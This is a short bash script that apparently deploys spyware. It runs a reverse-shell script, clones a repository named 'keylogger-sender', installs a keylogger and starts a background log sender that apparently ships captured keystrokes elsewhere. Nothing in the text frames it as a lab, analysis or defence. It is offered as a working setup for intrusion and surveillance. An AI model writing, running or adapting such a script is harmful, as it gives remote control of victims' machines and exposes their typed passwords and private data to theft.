#!/bin/bash

# Open reverse shell
python3 reverse_shell.py

# Clone repository (if not already cloned)
if [ ! -d "keylogger-sender" ]; then
    git clone https://github.com/TomatoBr0/keylogger-sender.git
    cd keylogger-sender
fi

# Install the keylogger
cd keylogger
./install.sh

# Start the log sender
cd ..
python3 log_sender.py &